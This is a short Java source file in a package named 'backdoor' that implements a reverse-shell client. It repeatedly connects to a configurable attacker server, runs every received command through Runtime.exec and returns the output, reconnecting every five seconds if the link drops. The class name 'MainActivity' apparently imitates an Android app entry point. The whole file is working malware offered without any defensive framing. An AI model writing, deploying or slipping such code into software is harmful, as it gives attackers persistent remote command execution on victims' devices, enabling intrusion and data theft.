package com.example.backdoor;

import java.io.*;
import java.net.Socket;

public class MainActivity {
    private static final String SERVER_IP = "0.0.0.0";  // Replace with your server IP
    private static final int SERVER_PORT = 5555;   // Replace with your server port

    public static void main(String[] args) {
        while (true) {
            try {
                Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);

                while (true) {
                    String command = in.readLine();
                    if (command == null || command.equals("quit")) {
                        break;
                    }
                    String result = executeCommand(command);
                    out.println(result);
                }

                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                Thread.sleep(5000);  // Retry after 5 seconds
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private static String executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
